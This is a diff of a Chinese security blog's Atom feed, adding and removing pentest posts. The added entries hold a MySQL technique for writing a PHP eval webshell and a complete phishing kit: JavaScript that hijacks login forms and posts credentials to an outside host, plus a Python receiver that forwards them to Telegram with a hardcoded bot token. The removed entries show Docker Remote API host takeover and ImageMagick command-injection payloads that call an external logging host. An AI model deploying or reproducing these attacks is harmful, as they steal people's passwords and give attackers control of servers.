@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://reboot.cf/"/>
-  <updated>2018-03-12T03:05:28.000Z</updated>
+  <updated>2018-03-14T07:17:56.000Z</updated>
   <id>http://reboot.cf/</id>
   
   <author>
@@ -15,6 +15,80 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>MySQL写Webshell</title>
+    <link href="http://reboot.cf/2018/03/14/MySQL%E5%86%99Webshell/"/>
+    <id>http://reboot.cf/2018/03/14/MySQL写Webshell/</id>
+    <published>2018-03-14T07:15:43.000Z</published>
+    <updated>2018-03-14T07:17:56.000Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>利用 OUTFILE 功能写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `test`.`pentest` (`pentestdata` TEXT NOT NULL );</span><br><span class="line">INSERT INTO `test`.`pentest` (`pentestdata` )VALUES (&apos;&lt;?php eval($_POST[a]);?&gt;&apos;);</span><br><span class="line">SELECT * FROM pentest INTO OUTFILE &apos;D:/phpStudy/WWW/pentest.php&apos;;</span><br></pre></td></tr></table></figure><p>利用日志功能写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general%&apos;;</span><br><span class="line">set global general_log = on;</span><br><span class="line">set global general_log_file = &apos;D:/phpStudy/WWW/pentest.php&apos;;</span><br><span class="line">select &apos;&lt;?php eval($_POST[a]);?&gt;&apos;;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;利用 OUTFILE 功能写文件&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;
+      
+    
+    </summary>
+    
+    
+      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
+    
+      <category term="Pentest" scheme="http://reboot.cf/tags/Pentest/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用Telegram API接收消息</title>
+    <link href="http://reboot.cf/2018/03/12/%E4%BD%BF%E7%94%A8Telegram-API%E6%8E%A5%E6%94%B6%E6%B6%88%E6%81%AF/"/>
+    <id>http://reboot.cf/2018/03/12/使用Telegram-API接收消息/</id>
+    <published>2018-03-12T06:51:36.000Z</published>
+    <updated>2018-03-12T06:56:56.986Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>Telegram Bot API <a href="https://core.telegram.org/bots/api" target="_blank" rel="noopener">文档地址</a></p><p>发送请求</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org/bot<span class="tag">&lt;<span class="name">token</span>&gt;</span>/METHOD_NAME</span><br></pre></td></tr></table></figure><p>获取更新数据</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org//bot<span class="tag">&lt;<span class="name">token</span>&gt;</span>/getUpdates</span><br></pre></td></tr></table></figure><p>发送消息</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://api.telegram.org/bot&#123;token&#125;/sendMessage?chat_id=&#123;chat_id&#125;&amp;text=&#123;data&#125;</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;Telegram Bot API &lt;a href=&quot;https://core.telegram.org/bots/api&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;文档地址&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;发送请求&lt;/p&gt;
+&lt;
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>利用js获取前端登录密码</title>
+    <link href="http://reboot.cf/2018/03/12/%E5%88%A9%E7%94%A8js%E8%8E%B7%E5%8F%96%E5%89%8D%E7%AB%AF%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81/"/>
+    <id>http://reboot.cf/2018/03/12/利用js获取前端登录密码/</id>
+    <published>2018-03-12T03:22:55.000Z</published>
+    <updated>2018-03-13T03:16:41.000Z</updated>
+    
+    <content type="html"><![CDATA[<a id="more"></a><p>前端代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Send_Data</span>(<span class="params">sj_url,sj_username,sj_passwd</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">                xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">                <span class="keyword">if</span>(xmlhttp.overrideMimeType) &#123; xmlhttp.overrideMimeType(<span class="string">'text/xml'</span>); &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.ActiveXObject) &#123;</span><br><span class="line">                <span class="keyword">var</span> xmlobj = [<span class="string">'Microsoft.XMLHTTP'</span>,<span class="string">'MSXML.XMLHTTP'</span>,<span class="string">'Msxml2.XMLHTTP.8.0'</span>,<span class="string">'Msxml2.XMLHTTP.7.0'</span>,<span class="string">'Msxml2.XMLHTTP.6.0'</span>,<span class="string">'Msxml2.XMLHTTP.3.0'</span>,<span class="string">'Msxml2.XMLHTTP'</span>];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; xmlobj.length;i++) &#123; <span class="keyword">try</span> &#123; xmlhttp = <span class="keyword">new</span> ActiveXObject(xmlobj[i]); &#125; <span class="keyword">catch</span>(e) &#123;&#125; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!xmlhttp) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">        <span class="keyword">var</span> time=<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">        sj_time = time.getFullYear()+<span class="string">"-"</span>+time.getMonth()+<span class="string">"-"</span>+time.getDate()+<span class="string">" "</span>+time.getHours()+<span class="string">":"</span>+time.getMinutes()+<span class="string">":"</span>+time.getUTCSeconds();</span><br><span class="line">        <span class="keyword">var</span> sjurl = <span class="string">'http://fish.hook.ga'</span>;</span><br><span class="line">        <span class="keyword">var</span> sjpos = <span class="built_in">escape</span>(sj_url)+<span class="string">'||'</span>+<span class="built_in">escape</span>(sj_username) +<span class="string">'||'</span>+<span class="built_in">escape</span>(sj_passwd)+<span class="string">"||"</span>+sj_time;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, sjurl, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">        xmlhttp.setRequestHeader(<span class="string">"Content-length"</span>,sjpos.length);</span><br><span class="line">        xmlhttp.setRequestHeader(<span class="string">"Connection"</span>,<span class="string">"close"</span>);</span><br><span class="line">        xmlhttp.send(sjpos);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Form_Hijack</span>(<span class="params">thisform</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> ispwd = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>;k &lt; thisform.elements.length;k++) &#123;</span><br><span class="line">                <span class="keyword">var</span> sjobj = thisform.elements[k]; <span class="keyword">if</span>(sjobj.type == <span class="string">'password'</span>) &#123; ispwd = <span class="literal">true</span>; <span class="keyword">break</span>; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!ispwd) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">        <span class="keyword">var</span> sj_url = <span class="built_in">window</span>.location;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.parent.location) &#123; sj_url = <span class="built_in">window</span>.parent.location; &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">window</span>.parent.document.referrer) &#123; sjref = <span class="built_in">window</span>.parent.document.referrer; &#125;</span><br><span class="line">        sj_username = <span class="built_in">document</span>.getElementById(<span class="string">"username"</span>).value;</span><br><span class="line">        sj_passwd = <span class="built_in">document</span>.getElementById(<span class="string">"password"</span>).value;</span><br><span class="line">        <span class="keyword">if</span>( sj_url &amp;&amp; sj_passwd ) &#123; Send_Data(sj_url,sj_username,sj_passwd); &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Start_Hijack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementsByTagName) &#123;</span><br><span class="line">                <span class="keyword">var</span> sjform = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"form"</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; sjform.length;i++) &#123; sjform[i].onsubmit = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> Form_Hijack(<span class="keyword">this</span>); &#125; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line"><span class="built_in">document</span>.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.readyState == <span class="string">"complete"</span>) &#123; setTimeout(<span class="string">'Start_Hijack()'</span>,<span class="number">1000</span>); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后端接收器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">8081</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">httplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    sock.send(<span class="string">'Welcome!'</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"POST"</span> <span class="keyword">in</span> data:</span><br><span class="line">            header, html = data.split(<span class="string">'\r\n\r\n'</span>, <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                url, username, password, datatime = html.split(<span class="string">'||'</span>, <span class="number">3</span>)</span><br><span class="line">                message = <span class="string">"[*] 接收到新消息！\n域名："</span> + url + <span class="string">"\n账号："</span> + username + <span class="string">"\n密码："</span> + password + <span class="string">"\n来源：%s:%s"</span> % addr + <span class="string">"\n时间："</span> + datatime + <span class="string">"\n"</span></span><br><span class="line">                <span class="keyword">print</span> message</span><br><span class="line">                sendData(message)</span><br><span class="line">                sock.close()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                error_message = <span class="string">"[*] 接收到新消息！\n但消息不合法！"</span> + <span class="string">"\n来源：%s:%s"</span> % addr + <span class="string">"\n时间："</span> + datatime +<span class="string">"\n"</span></span><br><span class="line">                <span class="keyword">print</span> error_message</span><br><span class="line">                sendData(error_message)</span><br><span class="line">                sock.close()</span><br><span class="line">        sock.close()</span><br><span class="line">    sock.close()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Connection from %s:%s closed.'</span> % addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendData</span><span class="params">(msg)</span>:</span></span><br><span class="line">    api_key = <span class="string">'491182934:AAEuOg4TaHpzRzQ1xWR4vcvOtv4KqLWoOQc'</span></span><br><span class="line">    chat_id = <span class="string">'560855481'</span></span><br><span class="line">    api_url = <span class="string">'https://api.telegram.org/bot&#123;&#125;/sendMessage?chat_id=&#123;&#125;&amp;text=&#123;&#125;'</span>.format(api_key, chat_id, msg)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        respond = requests.get(api_url)</span><br><span class="line">        <span class="keyword">print</span> respond.content</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"消息发送失败！"</span>, e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Socket created'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    s.bind((HOST, PORT))</span><br><span class="line"><span class="keyword">except</span> socket.error , msg:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[！] Bind failed. Error Code : '</span> + str(msg[<span class="number">0</span>]) + <span class="string">' Message '</span> + msg[<span class="number">1</span>]</span><br><span class="line">sys.exit()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Socket bind complete'</span></span><br><span class="line">s.listen(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[*] Socket now listening'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    sock, addr = s.accept()</span><br><span class="line">    t = threading.Thread(target=httplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;p&gt;前端代码：&lt;/p&gt;
+&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;l
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>重编译安装OpenSSH记录登录密码</title>
@@ -367,70 +441,6 @@
       <category term="GitHub" scheme="http://reboot.cf/tags/GitHub/"/>
     
       <category term="Git" scheme="http://reboot.cf/tags/Git/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Docker Remote API未授权访问漏洞</title>
-    <link href="http://reboot.cf/2016/08/18/Docker-Remote-API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://reboot.cf/2016/08/18/Docker-Remote-API未授权访问漏洞/</id>
-    <published>2016-08-18T06:23:44.000Z</published>
-    <updated>2018-01-19T01:55:52.650Z</updated>
-    
-    <content type="html"><![CDATA[<p>Docker是一个开源的应用容器引擎，允许开发者将其应用和依赖包打包到一个可移植的容器中，并发布到任何流行的Linux机器上，以实现虚拟化<br><a id="more"></a></p><h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>Docker的<code>Remote API</code>因配置不当可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可访问到Docker数据，可能导致敏感信息泄露，黑客也可以恶意删除Docker上的数据；攻击者可进一步利用Docker自身特性，直接访问宿主机上的敏感信息，或对敏感文件进行修改，最终完全控制服务器</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>访问<code>http</code>请求<code>curl x.x.x.x:2375/info</code><br>如果返回码<code>200</code>，并且返回<code>DockerRootDir</code>等字符，则证明存在目标存在未授权访问漏洞。<br>查看以有镜像列表</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://0.0.0.0:2375 images</span><br></pre></td></tr></table></figure><p>如果不存在镜像，可主动<code>pull</code>一个，其中默认存在的镜像中<code>busybox</code>体积最小，这里拿<code>Ubuntu</code>举例。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://0.0.0.0:2375 pull ubuntu</span><br></pre></td></tr></table></figure><p>运行容器并挂载系统根目录（/）。该命令将宿主根目录（/）挂载到容器中/mnt目录下，所有操作在mnt目录下进行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://0.0.0.0:2375 run -v /:/mnt -ti ubuntu /bin/bash</span><br></pre></td></tr></table></figure><p>生成ssh免密码登录<code>key</code>，得到<code>id_rsa.pub</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen –t rsa –C <span class="string">"root"</span></span><br></pre></td></tr></table></figure><p>替换对应<code>/mnt/root/.ssh/authorized_keys</code>文件内容。（测试过程记得保存原始）<br>直接ssh登录即可。</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><h2 id="修改Docker-Remote-API服务默认参数"><a href="#修改Docker-Remote-API服务默认参数" class="headerlink" title="修改Docker Remote API服务默认参数"></a>修改Docker Remote API服务默认参数</h2><p>注意：该操作需要重启Docker服务才能生效<br>修改Docker的启动参数：<br>定位到<code>DOCKER_OPTS</code>中的<code>tcp://0.0.0.0:2375</code>，将<code>0.0.0.0修</code>改为<code>127.0.0.1</code>或将默认端口<code>2375</code>改为自定义端口</p><h2 id="为Remote-API设置认证措施"><a href="#为Remote-API设置认证措施" class="headerlink" title="为Remote API设置认证措施"></a>为Remote API设置认证措施</h2><p>参照<a href="https://docs.docker.com/develop/sdk/" target="_blank" rel="noopener">官方文档</a>配置Remote API的认证措施<br>注意：该操作需要重启<code>Docker</code>服务才能生效。<br>修改Docker服务运行账号，请以较低权限账号运行<code>Docker</code>服务；另外，可以限制攻击者执行高危命令。<br>注意：该操作需要重启<code>Docker</code>服务才能生效。</p><h2 id="设置防火墙策略"><a href="#设置防火墙策略" class="headerlink" title="设置防火墙策略"></a>设置防火墙策略</h2><p>如果正常业务中<code>API</code>服务需要被其他服务器来访问，可以配置安全组策略或<code>iptables</code>策略，仅允许指定的<code>IP</code>来访问<code>Docker</code>接口。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;Docker是一个开源的应用容器引擎，允许开发者将其应用和依赖包打包到一个可移植的容器中，并发布到任何流行的Linux机器上，以实现虚拟化&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
-    
-      <category term="Vulnerability" scheme="http://reboot.cf/tags/Vulnerability/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ImageMagick命令执行</title>
-    <link href="http://reboot.cf/2016/08/18/ImageMagick%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    <id>http://reboot.cf/2016/08/18/ImageMagick命令执行/</id>
-    <published>2016-08-18T06:07:39.000Z</published>
-    <updated>2018-01-19T01:55:59.986Z</updated>
-    
-    <content type="html"><![CDATA[<p>ImageMagick是一款开源图片处理库，支持<code>PHP</code>、<code>Ruby</code>、<code>NodeJS</code>和<code>Python</code>等多种语言。目前官方披露称，ImageMagick存在一处远程命令执行漏洞<code>（CVE-2016–3714）</code>，当其处理的上传图片带有攻击代码时，可被远程执行任意代码，进而导致攻击者控制服务器<br><a id="more"></a></p><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>命令执行漏洞是出在ImageMagick对https形式的文件处理的过程中。ImageMagick之所以支持那么多的文件格式，是因为它内置了非常多的图像处理库，对于这些图像处理库，ImageMagick给它起了个名字叫做<code>Delegate</code>(委托)，每个<code>Delegate</code>对应一种格式的文件，然后通过系统的<code>system()</code>命令来调用外部的<code>lib</code>进行处理。调用外部<code>lib</code>的过程是使用系统的<code>system</code>命令来执行的，导致命令执行的代码。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>无法回显，通过反弹<code>shell</code>或者使用<code>DNS Log</code>来记录是否命令执行结果</p><h2 id="ImageMagick-popen-命令执行"><a href="#ImageMagick-popen-命令执行" class="headerlink" title="ImageMagick popen()命令执行"></a>ImageMagick popen()命令执行</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">image copy 200,200 100,100 <span class="string">"|wget http://imagemagick.rce.dnsrecord.tk/`id`"</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure><h1 id="ImageMagick远程命令执行漏洞（CVE-2016–3714）"><a href="#ImageMagick远程命令执行漏洞（CVE-2016–3714）" class="headerlink" title="ImageMagick远程命令执行漏洞（CVE-2016–3714）"></a>ImageMagick远程命令执行漏洞（CVE-2016–3714）</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi 1.svg</span><br><span class="line">push graphic-context</span><br><span class="line">viewbox 0 0 640 480</span><br><span class="line">fill <span class="string">'url(https://example.com/image.jpg"|ping imagemagick.rce.dnsrecord.tk")'</span></span><br><span class="line">pop graphic-context</span><br></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;ImageMagick是一款开源图片处理库，支持&lt;code&gt;PHP&lt;/code&gt;、&lt;code&gt;Ruby&lt;/code&gt;、&lt;code&gt;NodeJS&lt;/code&gt;和&lt;code&gt;Python&lt;/code&gt;等多种语言。目前官方披露称，ImageMagick存在一处远程命令执行漏洞&lt;code&gt;（CVE-2016–3714）&lt;/code&gt;，当其处理的上传图片带有攻击代码时，可被远程执行任意代码，进而导致攻击者控制服务器&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="Tips" scheme="http://reboot.cf/tags/Tips/"/>
-    
-      <category term="Vulnerability" scheme="http://reboot.cf/tags/Vulnerability/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Ubuntu使用Kali软件源</title>
-    <link href="http://reboot.cf/2016/06/29/Ubuntu%E4%BD%BF%E7%94%A8Kali%E8%BD%AF%E4%BB%B6%E6%BA%90/"/>
-    <id>http://reboot.cf/2016/06/29/Ubuntu使用Kali软件源/</id>
-    <published>2016-06-29T06:01:57.000Z</published>
-    <updated>2018-01-19T01:58:31.815Z</updated>
-    
-    <content type="html"><![CDATA[<p>近期在上搭环境，用到大量的kali下的工具，一个个移植太麻烦。Ubuntu和Kali-Linux同样基于Debian，源可以共用。就考虑替换软件源来解决<br><a id="more"></a></p><h1 id="替换源"><a href="#替换源" class="headerlink" title="替换源"></a>替换源</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure><h1 id="导入公钥"><a href="#导入公钥" class="headerlink" title="导入公钥"></a>导入公钥</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gpg --keyserver pgpkeys.mit.edu --recv-key  ED444FF07D8D0BF6</span><br><span class="line">gpg -a --<span class="built_in">export</span> ED444FF07D8D0BF6 | apt-key add -</span><br></pre></td></tr></table></figure><h1 id="更新系统"><a href="#更新系统" class="headerlink" title="更新系统"></a>更新系统</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update &amp;&amp; apt upgrade -y</span><br></pre></td></tr></table></figure><p>这里<code>vps</code>环境是<code>ubuntu 16.04</code></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;近期在上搭环境，用到大量的kali下的工具，一个个移植太麻烦。Ubuntu和Kali-Linux同样基于Debian，源可以共用。就考虑替换软件源来解决&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="Linux" scheme="http://reboot.cf/tags/Linux/"/>
     
   </entry>
   
